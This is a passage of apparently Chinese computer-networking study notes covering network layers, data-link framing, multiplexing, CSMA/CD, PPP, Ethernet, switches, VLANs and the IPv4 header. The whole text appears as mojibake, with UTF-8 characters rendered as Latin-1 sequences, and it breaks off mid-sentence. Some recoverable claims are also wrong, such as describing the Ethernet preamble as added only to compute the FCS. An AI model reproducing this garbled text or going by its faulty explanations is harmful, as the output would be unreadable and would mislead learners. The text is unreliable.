ï¼šç½‘ç»œå±‚é’ˆå¯¹çš„è¿˜æ˜¯ä¸»æœºä¹‹é—´çš„æ•°æ®ä¼ è¾“æœåŠ¡ï¼Œè€Œä¸»æœºä¹‹é—´å¯ä»¥æœ‰å¾ˆå¤šé“¾è·¯ï¼Œé“¾è·¯å±‚åè®®å°±æ˜¯ä¸ºåŒä¸€é“¾è·¯çš„èŠ‚ç‚¹æä¾›æœåŠ¡ã€‚æ•°æ®é“¾è·¯å±‚æŠŠç½‘ç»œå±‚ä¼ æ¥çš„åˆ†ç»„å°è£…æˆå¸§ã€‚ ç‰©ç†å±‚ ï¼šè€ƒè™‘çš„æ˜¯æ€æ ·åœ¨ä¼ è¾“åª’ä½“ä¸Šä¼ è¾“æ•°æ®æ¯”ç‰¹æµï¼Œè€Œä¸æ˜¯æŒ‡å…·ä½“çš„ä¼ è¾“åª’ä½“ã€‚ç‰©ç†å±‚çš„ä½œç”¨æ˜¯å°½å¯èƒ½å±è”½ä¼ è¾“åª’ä½“å’Œé€šä¿¡æ‰‹æ®µçš„å·®å¼‚ï¼Œä½¿æ•°æ®é“¾è·¯å±‚æ„Ÿè§‰ä¸åˆ°è¿™äº›å·®å¼‚ã€‚ 2. ä¸ƒå±‚åè®®å…¶ä¸­è¡¨ç¤ºå±‚å’Œä¼šè¯å±‚ç”¨é€”å¦‚ä¸‹ï¼š è¡¨ç¤ºå±‚ ï¼šæ•°æ®å‹ç¼©ã€åŠ å¯†ä»¥åŠæ•°æ®æè¿°ã€‚è¿™ä½¿å¾—åº”ç”¨ç¨‹åºä¸å¿…æ‹…å¿ƒåœ¨å„å°ä¸»æœºä¸­è¡¨ç¤º/å­˜å‚¨çš„å†…éƒ¨æ ¼å¼ä¸åŒçš„é—®é¢˜ã€‚ ä¼šè¯å±‚ ï¼šå»ºç«‹åŠç®¡ç†ä¼šè¯ã€‚ äº”å±‚åè®®æ²¡æœ‰è¡¨ç¤ºå±‚å’Œä¼šè¯å±‚ï¼Œè€Œæ˜¯å°†è¿™äº›åŠŸèƒ½ç•™ç»™åº”ç”¨ç¨‹åºå¼€å‘è€…å¤„ç†ã€‚ 3. æ•°æ®åœ¨å„å±‚ä¹‹é—´çš„ä¼ é€’è¿‡ç¨‹åœ¨å‘ä¸‹çš„è¿‡ç¨‹ä¸­ï¼Œéœ€è¦æ·»åŠ ä¸‹å±‚åè®®æ‰€éœ€è¦çš„é¦–éƒ¨æˆ–è€…å°¾éƒ¨ï¼Œè€Œåœ¨å‘ä¸Šçš„è¿‡ç¨‹ä¸­ä¸æ–­æ‹†å¼€é¦–éƒ¨å’Œå°¾éƒ¨ã€‚ è·¯ç”±å™¨åªæœ‰ä¸‹é¢ä¸‰å±‚åè®®ï¼Œå› ä¸ºè·¯ç”±å™¨ä½äºç½‘ç»œæ ¸å¿ƒä¸­ï¼Œä¸éœ€è¦ä¸ºè¿›ç¨‹æˆ–è€…åº”ç”¨ç¨‹åºæä¾›æœåŠ¡ï¼Œå› æ­¤ä¹Ÿå°±ä¸éœ€è¦è¿è¾“å±‚å’Œåº”ç”¨å±‚ã€‚ 4. TCP/IPå®ƒåªæœ‰å››å±‚ï¼Œç›¸å½“äºäº”å±‚åè®®ä¸­æ•°æ®é“¾è·¯å±‚å’Œç‰©ç†å±‚åˆå¹¶ä¸ºç½‘ç»œæ¥å£å±‚ã€‚ ç°åœ¨çš„ TCP/IP ä½“ç³»ç»“æ„ä¸ä¸¥æ ¼éµå¾ª OSI åˆ†å±‚æ¦‚å¿µï¼Œåº”ç”¨å±‚å¯èƒ½ä¼šç›´æ¥ä½¿ç”¨ IP å±‚æˆ–è€…ç½‘ç»œæ¥å£å±‚ã€‚ TCP/IP åè®®æ—æ˜¯ä¸€ç§æ²™æ¼å½¢çŠ¶ï¼Œä¸­é—´å°ä¸¤è¾¹å¤§ï¼ŒIP åè®®åœ¨å…¶ä¸­å ç”¨ä¸¾è¶³è½»é‡çš„åœ°ä½ã€‚ äºŒã€ç‰©ç†å±‚é€šä¿¡æ–¹å¼æ ¹æ®ä¿¡æ¯åœ¨ä¼ è¾“çº¿ä¸Šçš„ä¼ é€æ–¹å‘ï¼Œåˆ†ä¸ºä»¥ä¸‹ä¸‰ç§é€šä¿¡æ–¹å¼ï¼š å•å·¥é€šä¿¡ï¼šå•å‘ä¼ è¾“ åŠåŒå·¥é€šä¿¡ï¼šåŒå‘äº¤æ›¿ä¼ è¾“ å…¨åŒå·¥é€šä¿¡ï¼šåŒå‘åŒæ—¶ä¼ è¾“ å¸¦é€šè°ƒåˆ¶æ¨¡æ‹Ÿä¿¡å·æ˜¯è¿ç»­çš„ä¿¡å·ï¼Œæ•°å­—ä¿¡å·æ˜¯ç¦»æ•£çš„ä¿¡å·ã€‚å¸¦é€šè°ƒåˆ¶æŠŠæ•°å­—ä¿¡å·è½¬æ¢ä¸ºæ¨¡æ‹Ÿä¿¡å·ã€‚ ä¸‰ã€æ•°æ®é“¾è·¯å±‚åŸºæœ¬é—®é¢˜1. å°è£…æˆå¸§å°†ç½‘ç»œå±‚ä¼ ä¸‹æ¥çš„åˆ†ç»„æ·»åŠ é¦–éƒ¨å’Œå°¾éƒ¨ï¼Œç”¨äºæ ‡è®°å¸§çš„å¼€å§‹å’Œç»“æŸã€‚ 2. é€æ˜ä¼ è¾“é€æ˜è¡¨ç¤ºä¸€ä¸ªå®é™…å­˜åœ¨çš„äº‹ç‰©çœ‹èµ·æ¥å¥½åƒä¸å­˜åœ¨ä¸€æ ·ã€‚ å¸§ä½¿ç”¨é¦–éƒ¨å’Œå°¾éƒ¨è¿›è¡Œå®šç•Œï¼Œå¦‚æœå¸§çš„æ•°æ®éƒ¨åˆ†å«æœ‰å’Œé¦–éƒ¨å°¾éƒ¨ç›¸åŒçš„å†…å®¹ï¼Œé‚£ä¹ˆå¸§çš„å¼€å§‹å’Œç»“æŸä½ç½®å°±ä¼šè¢«é”™è¯¯çš„åˆ¤å®šã€‚éœ€è¦åœ¨æ•°æ®éƒ¨åˆ†å‡ºç°é¦–éƒ¨å°¾éƒ¨ç›¸åŒçš„å†…å®¹å‰é¢æ’å…¥è½¬ä¹‰å­—ç¬¦ï¼Œå¦‚æœå‡ºç°è½¬ä¹‰å­—ç¬¦ï¼Œé‚£ä¹ˆå°±åœ¨è½¬ä¹‰å­—ç¬¦å‰é¢å†åŠ ä¸ªè½¬ä¹‰å­—ç¬¦ï¼Œåœ¨æ¥æ”¶ç«¯è¿›è¡Œå¤„ç†ä¹‹åå¯ä»¥è¿˜åŸå‡ºåŸå§‹æ•°æ®ã€‚è¿™ä¸ªè¿‡ç¨‹é€æ˜ä¼ è¾“çš„å†…å®¹æ˜¯è½¬ä¹‰å­—ç¬¦ï¼Œç”¨æˆ·å¯Ÿè§‰ä¸åˆ°è½¬ä¹‰å­—ç¬¦çš„å­˜åœ¨ã€‚ 3. å·®é”™æ£€æµ‹ç›®å‰æ•°æ®é“¾è·¯å±‚å¹¿æ³›ä½¿ç”¨äº†å¾ªç¯å†—ä½™æ£€éªŒï¼ˆCRCï¼‰æ¥æ£€æŸ¥æ¯”ç‰¹å·®é”™ã€‚ ä¿¡é“åˆ†ç±»1. å¹¿æ’­ä¿¡é“ä¸€å¯¹å¤šé€šä¿¡ï¼Œä¸€ä¸ªèŠ‚ç‚¹å‘é€çš„æ•°æ®èƒ½å¤Ÿè¢«å¹¿æ’­ä¿¡é“ä¸Šæ‰€æœ‰çš„èŠ‚ç‚¹æ¥æ”¶åˆ°ã€‚ æ‰€æœ‰çš„èŠ‚ç‚¹éƒ½åœ¨åŒä¸€ä¸ªå¹¿æ’­ä¿¡é“ä¸Šå‘é€æ•°æ®ï¼Œå› æ­¤éœ€è¦æœ‰ä¸“é—¨çš„æ§åˆ¶æ–¹æ³•è¿›è¡Œåè°ƒï¼Œé¿å…å‘ç”Ÿå†²çªï¼ˆå†²çªä¹Ÿå«ç¢°æ’ï¼‰ã€‚ ä¸»è¦æœ‰ä¸¤ç§æ§åˆ¶æ–¹æ³•è¿›è¡Œåè°ƒï¼Œä¸€ä¸ªæ˜¯ä½¿ç”¨ä¿¡é“å¤ç”¨æŠ€æœ¯ï¼Œä¸€æ˜¯ä½¿ç”¨ CSMA/CD åè®®ã€‚ 2. ç‚¹å¯¹ç‚¹ä¿¡é“ä¸€å¯¹ä¸€é€šä¿¡ã€‚ å› ä¸ºä¸ä¼šå‘ç”Ÿç¢°æ’ï¼Œå› æ­¤ä¹Ÿæ¯”è¾ƒç®€å•ï¼Œä½¿ç”¨ PPP åè®®è¿›è¡Œæ§åˆ¶ã€‚ ä¿¡é“å¤ç”¨æŠ€æœ¯1. é¢‘åˆ†å¤ç”¨é¢‘åˆ†å¤ç”¨çš„æ‰€æœ‰ä¸»æœºåœ¨ç›¸åŒçš„æ—¶é—´å ç”¨ä¸åŒçš„é¢‘ç‡å¸¦å®½èµ„æºã€‚ 2. æ—¶åˆ†å¤ç”¨æ—¶åˆ†å¤ç”¨çš„æ‰€æœ‰ä¸»æœºåœ¨ä¸åŒçš„æ—¶é—´å ç”¨ç›¸åŒçš„é¢‘ç‡å¸¦å®½èµ„æºã€‚ ä½¿ç”¨é¢‘åˆ†å¤ç”¨å’Œæ—¶åˆ†å¤ç”¨è¿›è¡Œé€šä¿¡ï¼Œåœ¨é€šä¿¡çš„è¿‡ç¨‹ä¸­ä¸»æœºä¼šä¸€ç›´å ç”¨ä¸€éƒ¨åˆ†ä¿¡é“èµ„æºã€‚ä½†æ˜¯ç”±äºè®¡ç®—æœºæ•°æ®çš„çªå‘æ€§è´¨ï¼Œé€šä¿¡è¿‡ç¨‹æ²¡å¿…è¦ä¸€ç›´å ç”¨ä¿¡é“èµ„æºè€Œä¸è®©å‡ºç»™å…¶å®ƒç”¨æˆ·ä½¿ç”¨ï¼Œå› æ­¤è¿™ä¸¤ç§æ–¹å¼å¯¹ä¿¡é“çš„åˆ©ç”¨ç‡éƒ½ä¸é«˜ã€‚ 3. ç»Ÿè®¡æ—¶åˆ†å¤ç”¨æ˜¯å¯¹æ—¶åˆ†å¤ç”¨çš„ä¸€ç§æ”¹è¿›ï¼Œä¸å›ºå®šæ¯ä¸ªç”¨æˆ·åœ¨æ—¶åˆ†å¤ç”¨å¸§ä¸­çš„ä½ç½®ï¼Œåªè¦æœ‰æ•°æ®å°±é›†ä¸­èµ·æ¥ç»„æˆç»Ÿè®¡æ—¶åˆ†å¤ç”¨å¸§ç„¶åå‘é€ã€‚ 4. æ³¢åˆ†å¤ç”¨å…‰çš„é¢‘åˆ†å¤ç”¨ã€‚ç”±äºå…‰çš„é¢‘ç‡å¾ˆé«˜ï¼Œå› æ­¤ä¹ æƒ¯ä¸Šç”¨æ³¢é•¿è€Œä¸æ˜¯é¢‘ç‡æ¥è¡¨ç¤ºæ‰€ä½¿ç”¨çš„å…‰è½½æ³¢ã€‚ 5. ç åˆ†å¤ç”¨ä¸ºæ¯ä¸ªç”¨æˆ·åˆ†é… m bit çš„ç ç‰‡ï¼Œå¹¶ä¸”æ‰€æœ‰çš„ç ç‰‡æ­£äº¤ï¼Œå¯¹äºä»»æ„ä¸¤ä¸ªç ç‰‡ å’Œ æœ‰ ä¸ºäº†è®¨è®ºæ–¹ä¾¿ï¼Œå– m=8ï¼Œè®¾ç ç‰‡ ä¸º 00011011ã€‚åœ¨æ‹¥æœ‰è¯¥ç ç‰‡çš„ç”¨æˆ·å‘é€æ¯”ç‰¹ 1 æ—¶å°±å‘é€è¯¥ç ç‰‡ï¼Œå‘é€æ¯”ç‰¹ 0 æ—¶å°±å‘é€è¯¥ç ç‰‡çš„åç  11100100ã€‚ åœ¨è®¡ç®—æ—¶å°† 00011011 è®°ä½œ (-1 -1 -1 +1 +1 -1 +1 +1)ï¼Œå¯ä»¥å¾—åˆ° å…¶ä¸­ ä¸º çš„åç ã€‚ åˆ©ç”¨ä¸Šé¢çš„å¼å­æˆ‘ä»¬çŸ¥é“ï¼Œå½“æ¥æ”¶ç«¯ä½¿ç”¨ç ç‰‡ å¯¹æ¥æ”¶åˆ°çš„æ•°æ®è¿›è¡Œå†…ç§¯è¿ç®—æ—¶ï¼Œç»“æœä¸º 0 çš„æ˜¯å…¶å®ƒç”¨æˆ·å‘é€çš„æ•°æ®ï¼Œç»“æœä¸º 1 çš„æ˜¯ç”¨æˆ·å‘é€çš„æ¯”ç‰¹ 1ï¼Œç»“æœä¸º -1 çš„æ˜¯ç”¨æˆ·å‘é€çš„æ¯”ç‰¹ 0ã€‚ ç åˆ†å¤ç”¨éœ€è¦å‘é€çš„æ•°æ®é‡ä¸ºåŸå…ˆçš„ m å€ã€‚ CSMA/CD åè®®*CSMA/CD è¡¨ç¤ºè½½æ³¢ç›‘å¬å¤šç‚¹æ¥å…¥ / ç¢°æ’æ£€æµ‹ã€‚ å¤šç‚¹æ¥å…¥ ï¼šè¯´æ˜è¿™æ˜¯æ€»çº¿å‹ç½‘ç»œï¼Œè®¸å¤šä¸»æœºä»¥å¤šç‚¹çš„æ–¹å¼è¿æ¥åˆ°æ€»çº¿ä¸Šã€‚ è½½æ³¢ç›‘å¬ ï¼šæ¯ä¸ªä¸»æœºéƒ½å¿…é¡»ä¸åœåœ°ç›‘å¬ä¿¡é“ã€‚åœ¨å‘é€å‰ï¼Œå¦‚æœç›‘å¬åˆ°ä¿¡é“æ­£åœ¨ä½¿ç”¨ï¼Œå°±å¿…é¡»ç­‰å¾…ã€‚ ç¢°æ’æ£€æµ‹ ï¼šåœ¨å‘é€ä¸­ï¼Œå¦‚æœç›‘å¬åˆ°ä¿¡é“å·²æœ‰å…¶å®ƒä¸»æœºæ­£åœ¨å‘é€æ•°æ®ï¼Œå°±è¡¨ç¤ºå‘ç”Ÿäº†ç¢°æ’ã€‚è™½ç„¶æ¯ä¸€ä¸ªä¸»æœºåœ¨å‘é€æ•°æ®ä¹‹å‰éƒ½å·²ç»ç›‘å¬åˆ°ä¿¡é“ä¸ºç©ºé—²ï¼Œä½†æ˜¯ç”±äºç”µç£æ³¢çš„ä¼ æ’­æ—¶å»¶çš„å­˜åœ¨ï¼Œè¿˜æ˜¯æœ‰å¯èƒ½ä¼šå‘ç”Ÿç¢°æ’ã€‚ è®°ç«¯åˆ°ç«¯çš„ä¼ æ’­æ—¶å»¶ä¸º Ï„ï¼Œæœ€å…ˆå‘é€çš„ç«™ç‚¹æœ€å¤šç»è¿‡ 2Ï„ å°±å¯ä»¥çŸ¥é“æ˜¯å¦å‘ç”Ÿäº†ç¢°æ’ï¼Œç§° 2Ï„ ä¸º äº‰ç”¨æœŸ ã€‚åªæœ‰ç»è¿‡äº‰ç”¨æœŸä¹‹åè¿˜æ²¡æœ‰æ£€æµ‹åˆ°ç¢°æ’ï¼Œæ‰èƒ½è‚¯å®šè¿™æ¬¡å‘é€ä¸ä¼šå‘ç”Ÿç¢°æ’ã€‚ å½“å‘ç”Ÿç¢°æ’æ—¶ï¼Œç«™ç‚¹è¦åœæ­¢å‘é€ï¼Œç­‰å¾…ä¸€æ®µæ—¶é—´å†å‘é€ã€‚è¿™ä¸ªæ—¶é—´é‡‡ç”¨ æˆªæ–­äºŒè¿›åˆ¶æŒ‡æ•°é€€é¿ç®—æ³• æ¥ç¡®å®šï¼Œä»ç¦»æ•£çš„æ•´æ•°é›†åˆ {0, 1, .., (2k-1)} ä¸­éšæœºå–å‡ºä¸€ä¸ªæ•°ï¼Œè®°ä½œ rï¼Œç„¶åå– r å€çš„äº‰ç”¨æœŸä½œä¸ºé‡ä¼ ç­‰å¾…æ—¶é—´ã€‚ PPP åè®®äº’è”ç½‘ç”¨æˆ·é€šå¸¸éœ€è¦è¿æ¥åˆ°æŸä¸ª ISP ä¹‹åæ‰èƒ½æ¥å…¥åˆ°äº’è”ç½‘ï¼ŒPPP åè®®æ˜¯ç”¨æˆ·è®¡ç®—æœºå’Œ ISP è¿›è¡Œé€šä¿¡æ—¶æ‰€ä½¿ç”¨çš„æ•°æ®é“¾è·¯å±‚åè®®ã€‚ åœ¨ PPP çš„å¸§ä¸­ï¼š F å­—æ®µä¸ºå¸§çš„å®šç•Œç¬¦ A å’Œ C å­—æ®µæš‚æ—¶æ²¡æœ‰æ„ä¹‰ FCS å­—æ®µæ˜¯ä½¿ç”¨ CRC çš„æ£€éªŒåºåˆ— ä¿¡æ¯éƒ¨åˆ†çš„é•¿åº¦ä¸è¶…è¿‡ 1500 MAC åœ°å€MAC åœ°å€æ˜¯é“¾è·¯å±‚åœ°å€ï¼Œé•¿åº¦ä¸º 6 å­—èŠ‚ï¼ˆ48 ä½ï¼‰ï¼Œç”¨äºå”¯ä¸€æ ‡è¯†ç½‘ç»œé€‚é…å™¨ï¼ˆç½‘å¡ï¼‰ã€‚ä¸€å°ä¸»æœºæ‹¥æœ‰å¤šå°‘ä¸ªé€‚é…å™¨å°±æœ‰å¤šå°‘ä¸ª MAC åœ°å€ã€‚ä¾‹å¦‚ç¬”è®°æœ¬ç”µè„‘æ™®éå­˜åœ¨æ— çº¿ç½‘ç»œé€‚é…å™¨å’Œæœ‰çº¿ç½‘ç»œé€‚é…å™¨ï¼Œå› æ­¤å°±æœ‰ä¸¤ä¸ª MAC åœ°å€ã€‚ å±€åŸŸç½‘å±€åŸŸç½‘æ˜¯å…¸å‹çš„ä¸€ç§å¹¿æ’­ä¿¡é“ï¼Œä¸»è¦ç‰¹ç‚¹æ˜¯ç½‘ç»œä¸ºä¸€ä¸ªå•ä½æ‰€æ‹¥æœ‰ï¼Œä¸”åœ°ç†èŒƒå›´å’Œç«™ç‚¹æ•°ç›®å‡æœ‰é™ã€‚ ä¸»è¦æœ‰ä»¥å¤ªç½‘ã€ä»¤ç‰Œç¯ç½‘ã€FDDI å’Œ ATM ç­‰å±€åŸŸç½‘æŠ€æœ¯ï¼Œç›®å‰ä»¥å¤ªç½‘å é¢†ç€ç°æœ‰çš„æœ‰çº¿å±€åŸŸç½‘å¸‚åœºã€‚ å¯ä»¥æŒ‰ç…§ç½‘ç»œæ‹“æ‰‘å¯¹å±€åŸŸç½‘è¿›è¡Œåˆ†ç±»ï¼š ä»¥å¤ªç½‘*ä»¥å¤ªç½‘æ˜¯ä¸€ç§æ˜Ÿå‹æ‹“æ‰‘ç»“æ„å±€åŸŸç½‘ã€‚ æ—©æœŸä½¿ç”¨é›†çº¿å™¨è¿›è¡Œè¿æ¥ï¼Œå®ƒæ˜¯ä¸€ç§ç‰©ç†å±‚è®¾å¤‡ï¼Œä½œç”¨äºæ¯”ç‰¹è€Œä¸æ˜¯å¸§ï¼Œå½“ä¸€ä¸ªæ¯”ç‰¹åˆ°è¾¾æ¥å£æ—¶ï¼Œé›†çº¿å™¨é‡æ–°ç”Ÿæˆè¿™ä¸ªæ¯”ç‰¹ï¼Œå¹¶å°†å…¶èƒ½é‡å¼ºåº¦æ”¾å¤§ï¼Œä»è€Œæ‰©å¤§ç½‘ç»œçš„ä¼ è¾“è·ç¦»ã€‚ä¹‹åå†å°†è¿™ä¸ªæ¯”ç‰¹å‘å…¶å®ƒæ‰€æœ‰æ¥å£ã€‚ç‰¹åˆ«æ˜¯ï¼Œå¦‚æœé›†çº¿å™¨åŒæ—¶æ”¶åˆ°åŒæ—¶ä»ä¸¤ä¸ªä¸åŒæ¥å£çš„å¸§ï¼Œé‚£ä¹ˆå°±å‘ç”Ÿäº†ç¢°æ’ã€‚ ç›®å‰ä»¥å¤ªç½‘ä½¿ç”¨äº¤æ¢æœºæ›¿ä»£äº†é›†çº¿å™¨ï¼Œå®ƒä¸ä¼šå‘ç”Ÿç¢°æ’ï¼Œèƒ½æ ¹æ® MAC åœ°å€è¿›è¡Œå­˜å‚¨è½¬å‘ã€‚ ä»¥å¤ªç½‘å¸§ï¼š ç±»å‹ ï¼šæ ‡è®°ä¸Šå±‚ä½¿ç”¨çš„åè®®ï¼› æ•°æ® ï¼šé•¿åº¦åœ¨ 46-1500 ä¹‹é—´ï¼Œå¦‚æœå¤ªå°åˆ™éœ€è¦å¡«å……ï¼› FCS ï¼šå¸§æ£€éªŒåºåˆ—ï¼Œä½¿ç”¨çš„æ˜¯ CRC æ£€éªŒæ–¹æ³•ï¼› å‰åŒæ­¥ç  ï¼šåªæ˜¯ä¸ºäº†è®¡ç®— FCS ä¸´æ—¶åŠ å…¥çš„ï¼Œè®¡ç®—ç»“æŸä¹‹åä¼šä¸¢å¼ƒã€‚ äº¤æ¢æœº*äº¤æ¢æœºå…·æœ‰è‡ªå­¦ä¹ èƒ½åŠ›ï¼Œå­¦ä¹ çš„æ˜¯äº¤æ¢è¡¨çš„å†…å®¹ã€‚äº¤æ¢è¡¨ä¸­å­˜å‚¨ç€ MAC åœ°å€åˆ°æ¥å£çš„æ˜ å°„ã€‚ä¸‹å›¾ä¸­ï¼Œäº¤æ¢æœºæœ‰ 4 ä¸ªæ¥å£ï¼Œä¸»æœº A å‘ä¸»æœº B å‘é€æ•°æ®å¸§æ—¶ï¼Œäº¤æ¢æœºæŠŠä¸»æœº A åˆ°æ¥å£ 1 çš„æ˜ å°„å†™å…¥äº¤æ¢è¡¨ä¸­ã€‚ä¸ºäº†å‘é€æ•°æ®å¸§åˆ° Bï¼Œå…ˆæŸ¥äº¤æ¢è¡¨ï¼Œæ­¤æ—¶æ²¡æœ‰ä¸»æœº B çš„è¡¨é¡¹ï¼Œé‚£ä¹ˆä¸»æœº A å°±å‘é€å¹¿æ’­å¸§ï¼Œä¸»æœº C å’Œä¸»æœº D ä¼šä¸¢å¼ƒè¯¥å¸§ã€‚ä¸»æœº B æ”¶ä¸‹ä¹‹åï¼ŒæŸ¥æ‰¾äº¤æ¢è¡¨å¾—åˆ°ä¸»æœº A æ˜ å°„çš„æ¥å£ä¸º 1ï¼Œå°±å‘é€æ•°æ®å¸§åˆ°æ¥å£ 1ï¼ŒåŒæ—¶äº¤æ¢æœºæ·»åŠ ä¸»æœº B åˆ°æ¥å£ 3 çš„æ˜ å°„ã€‚ å®ƒæ˜¯ä¸€ç§å³æ’å³ç”¨æ€¥ç”¨çš„è®¾å¤‡ï¼Œä¸éœ€è¦ç½‘ç»œç®¡ç†å‘˜å¹²é¢„ã€‚ è™šæ‹Ÿå±€åŸŸç½‘è™šæ‹Ÿå±€åŸŸç½‘å¯ä»¥å»ºç«‹ä¸ç‰©ç†ä½ç½®æ— å…³çš„é€»è¾‘ç»„ï¼Œåªæœ‰åœ¨åŒä¸€ä¸ªè™šæ‹Ÿå±€åŸŸç½‘ä¸­çš„æˆå‘˜æ‰ä¼šæ”¶åˆ°é“¾è·¯å±‚å¹¿æ’­ä¿¡æ¯ï¼Œä¾‹å¦‚ä¸‹å›¾ä¸­ (A1, A2, A3, A4) å±äºä¸€ä¸ªè™šæ‹Ÿå±€åŸŸç½‘ï¼ŒA1 å‘é€çš„å¹¿æ’­ä¼šè¢« A2ã€A3ã€A4 æ”¶åˆ°ï¼Œè€Œå…¶å®ƒç«™ç‚¹æ”¶ä¸åˆ°ã€‚ ä½¿ç”¨ VLAN å¹²çº¿è¿æ¥æ¥å»ºç«‹è™šæ‹Ÿå±€åŸŸç½‘ï¼Œæ¯å°äº¤æ¢æœºä¸Šçš„ä¸€ä¸ªç‰¹æ®Šç«¯å£è¢«è®¾ç½®ä¸ºå¹²çº¿ç«¯å£ï¼Œä»¥äº’è¿ VLAN äº¤æ¢æœºã€‚IEEE å®šä¹‰äº†ä¸€ç§æ‰©å±•çš„ä»¥å¤ªç½‘å¸§æ ¼å¼â€”â€”802.1Qï¼Œç”¨äºè·¨ VLAN å¹²çº¿çš„å¸§ï¼Œå®ƒåœ¨æ ‡å‡†ä»¥å¤ªç½‘å¸§ä¸ŠåŠ è¿›äº† 4 å­—èŠ‚é¦–éƒ¨ VLAN æ ‡ç­¾ï¼Œç”¨äºè¡¨ç¤ºè¯¥å¸§å±äºå“ªä¸€ä¸ªè™šæ‹Ÿå±€åŸŸç½‘ã€‚ å››ã€ç½‘ç»œå±‚*æ¦‚è¿°å› ä¸ºç½‘ç»œå±‚æ˜¯æ•´ä¸ªäº’è”ç½‘çš„æ ¸å¿ƒï¼Œå› æ­¤åº”å½“è®©ç½‘ç»œå±‚å°½å¯èƒ½ç®€å•ã€‚ç½‘ç»œå±‚å‘ä¸Šåªæä¾›ç®€å•çµæ´»çš„ã€æ— è¿æ¥çš„ã€å°½æœ€å¤§åŠªåŠ›äº¤äº’çš„æ•°æ®æŠ¥æœåŠ¡ã€‚ ä½¿ç”¨ IP åè®®ï¼Œå¯ä»¥æŠŠå¼‚æ„çš„ç‰©ç†ç½‘ç»œè¿æ¥èµ·æ¥ï¼Œä½¿å¾—åœ¨ç½‘ç»œå±‚çœ‹èµ·æ¥å¥½åƒæ˜¯ä¸€ä¸ªç»Ÿä¸€çš„ç½‘ç»œã€‚ ä¸ IP åè®®é…å¥—ä½¿ç”¨çš„è¿˜æœ‰ä¸‰ä¸ªåè®®ï¼š åœ°å€è§£æåè®® ARPï¼ˆAddress Resolution Protocolï¼‰ ç½‘é™…æ§åˆ¶æŠ¥æ–‡åè®® ICMPï¼ˆInternet Control Message Protocolï¼‰ ç½‘é™…ç»„ç®¡ç†åè®® IGMPï¼ˆInternet Group Management Protocolï¼‰ IP æ•°æ®æŠ¥æ ¼å¼ ç‰ˆæœ¬ : æœ‰ 4ï¼ˆIPv4ï¼‰å’Œ 6ï¼ˆIPv6ï¼‰ä¸¤ä¸ªå€¼ï¼› é¦–éƒ¨é•¿åº¦ : å  4 ä½ï¼Œå› æ­¤æœ€å¤§å€¼ä¸º 15ã€‚å€¼ä¸º 1 è¡¨ç¤ºçš„æ˜¯ 1 ä¸ª 32 ä½å­—çš„é•¿åº¦ï¼Œä¹Ÿå°±æ˜¯ 4 å­—èŠ‚ã€‚å› ä¸ºé¦–éƒ¨å›ºå®šé•¿åº¦ä¸º 20 å­—èŠ‚ï¼Œå› æ­¤è¯¥å€¼æœ€å°ä¸º 5ã€‚å¦‚æœå¯é€‰å­—æ®µçš„é•¿åº¦ä¸æ˜¯ 4 å­—èŠ‚çš„æ•´æ•°å€ï¼Œå°±ç”¨å°¾éƒ¨çš„å¡«å……éƒ¨åˆ†æ¥å¡«å……ã€‚ åŒºåˆ†æœåŠ¡ : ç”¨æ¥è·å¾—æ›´å¥½çš„æœåŠ¡ï¼Œä¸€èˆ¬æƒ…å†µä¸‹ä¸ä½¿ç”¨ã€‚ æ€»é•¿åº¦ : åŒ…æ‹¬é¦–éƒ¨é•¿åº¦å’Œæ•°æ®éƒ¨åˆ†é•¿åº¦ã€‚ ç”Ÿå­˜æ—¶é—´ ï¼šTTLï¼Œå®ƒçš„å­˜åœ¨æ˜¯ä¸ºäº†é˜²æ­¢æ— æ³•äº¤ä»˜çš„æ•°æ®æŠ¥åœ¨äº’è”ç½‘ä¸­ä¸æ–­å…œåœˆå­ã€‚ä»¥è·¯ç”±å™¨è·³æ•°ä¸ºå•ä½ï¼Œå½“ TTL ä¸º 0 æ—¶å°±ä¸¢å¼ƒæ•°æ®æŠ¥ã€‚ åè®® ï¼šæŒ‡å‡ºæºå¸¦çš„æ•°æ®åº”è¯¥ä¸Šäº¤ç»™å“ªä¸ªåè®®è¿›è¡Œå¤„ç†ï¼Œä¾‹å¦‚ ICMPã€TCPã€UDP ç­‰ã€‚ é¦–éƒ¨æ£€éªŒå’Œ ï¼šå› ä¸ºæ•°æ®æŠ¥æ¯ç»è¿‡ä¸€ä¸ªè·¯ç”±å™¨ï¼Œéƒ½è¦é‡æ–°è®¡ç®—æ£€éªŒå’Œï¼Œå› æ­¤æ£€éªŒå’Œä¸åŒ…å«æ•°æ®éƒ¨åˆ†å¯ä»¥å‡å°‘è®¡ç®—çš„å·¥ä½œé‡ã€‚ æ ‡è¯† : åœ¨æ•°æ®æŠ¥é•¿åº¦è¿‡é•¿ä»è€Œå‘ç”Ÿåˆ†ç‰‡çš„æƒ…å†µä¸‹ï¼Œç›¸åŒæ•°æ®æŠ¥çš„ä¸åŒåˆ†ç‰‡å…·æœ‰ç›¸åŒçš„æ ‡è¯†ç¬¦ã€‚ ç‰‡åç§» : å’Œæ ‡è¯†ç¬¦ä¸€èµ·ï¼Œç”¨äºå‘ç”Ÿåˆ†ç‰‡çš„æƒ…å†µã€‚ç‰‡åç§»çš„å•ä½ä¸º 8 å­—èŠ‚ã€‚ IP åœ°å€ç¼–å€æ–¹å¼IP åœ°å€çš„ç¼–å€æ–¹å¼ç»å†äº†ä¸‰ä¸ªå†å²é˜¶æ®µï¼š åˆ†ç±» å­ç½‘åˆ’åˆ† æ— åˆ†ç±» 1. åˆ†ç±»ç”±ä¸¤éƒ¨åˆ†ç»„æˆï¼Œç½‘ç»œå·å’Œä¸»æœºå·ï¼Œå…¶ä¸­ä¸åŒåˆ†ç±»å…·æœ‰ä¸åŒçš„ç½‘ç»œå·é•¿åº¦ï¼Œå¹¶ä¸”æ˜¯å›ºå®šçš„ã€‚ IP åœ°å€ ::= {&lt; ç½‘ç»œå· &gt;, &lt; ä¸»æœºå· &gt;} 2. å­ç½‘åˆ’åˆ†é€šè¿‡åœ¨ä¸»æœºå·å­—æ®µä¸­æ‹¿ä¸€éƒ¨åˆ†ä½œä¸ºå­ç½‘å·ï¼ŒæŠŠä¸¤çº§ IP åœ°å€åˆ’åˆ†ä¸ºä¸‰çº§ IP åœ°å€ã€‚æ³¨æ„ï¼Œå¤–éƒ¨ç½‘ç»œçœ‹ä¸åˆ°å­ç½‘çš„å­˜åœ¨ã€‚ IP åœ°å€ ::= {&lt; ç½‘ç»œå· &gt;, &lt; å­ç½‘å· &gt;, &lt; ä¸»æœºå· &gt;} è¦ä½¿ç”¨å­ç½‘ï¼Œå¿…é¡»é…ç½®å­ç½‘æ©ç ã€‚ä¸€ä¸ª B 